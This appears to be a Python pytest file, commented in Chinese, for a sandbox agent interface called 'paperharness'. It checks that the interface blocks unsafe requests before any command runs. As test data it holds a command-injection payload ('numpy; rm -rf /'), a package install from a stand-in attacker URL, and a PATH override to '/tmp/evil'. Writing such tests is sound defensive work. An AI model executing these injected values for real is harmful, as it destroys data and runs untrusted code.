"""沙箱安全测试中**不需要容器**的两条（契约第 3 节清单的 13、14）。

为什么要单独一个文件：拒绝发生在 ACI 层，动作根本到不了沙箱，所以这两条
**不该被 Docker 环境缺失跳过**——它们恰恰是「拒绝时零副作用」的直接证据，
本机就该真跑。

`test_docker_sandbox.py` 里其余 13 条需要真实容器，那整个模块会按环境 `skip`。
"""

from __future__ import annotations

import pytest


def _aci_over(fake_session, workspace):
    from paperharness.aci import PaperACI
    from paperharness.contracts.run import RunPlan

    plan = RunPlan(
        resolved_revision="0" * 40,
        python_version="3.10",
        command=["python", "main.py"],
        source="user",
    )
    return PaperACI(fake_session, workspace, plan, timeout_seconds=60)


@pytest.fixture
def offline_session(tmp_path):
    """不需要 Docker 的假 session：用来记录「有没有被调用」。"""
    from paperharness.sandbox.fake import FakeSandboxSession

    workspace = tmp_path / "ws"
    workspace.mkdir()
    return FakeSandboxSession(workspace=workspace)


def test_13_aci_rejects_command_injection_in_requirement(offline_session):
    """清单第 13 条：`install_requirement` 拒绝 `numpy; rm -rf /` 和 URL 形式。

    断言两层：动作被拒，且**根本没有任何命令被发出**（零副作用）。
    """
    from paperharness.contracts.run import InstallRequirementAction

    aci = _aci_over(offline_session, offline_session.workspace)

    for payload in ("numpy; rm -rf /", "numpy @ https://evil.example/x.tar.gz"):
        observation = aci.execute(
            InstallRequirementAction(action="install_requirement", requirement=payload)
        )
        assert observation.ok is False, f"未拦截注入串：{payload}"
        assert observation.summary == "requirement_not_allowed"

    assert offline_session.commands == [], "被拒绝的依赖串仍然触发了命令执行"
    assert offline_session.network_enabled is True, "校验失败不该改变网络状态"


def test_14_aci_rejects_path_env_override(offline_session):
    """清单第 14 条：`set_environment` 拒绝 PATH 覆盖。"""
    from paperharness.contracts.run import SetEnvironmentAction

    aci = _aci_over(offline_session, offline_session.workspace)

    observation = aci.execute(
        SetEnvironmentAction(action="set_environment", name="PATH", value="/tmp/evil")
    )

    assert observation.ok is False
    assert observation.summary == "env_not_allowed:PATH"
    assert offline_session.environment == {}, "被拒绝的环境变量仍然写进去了"
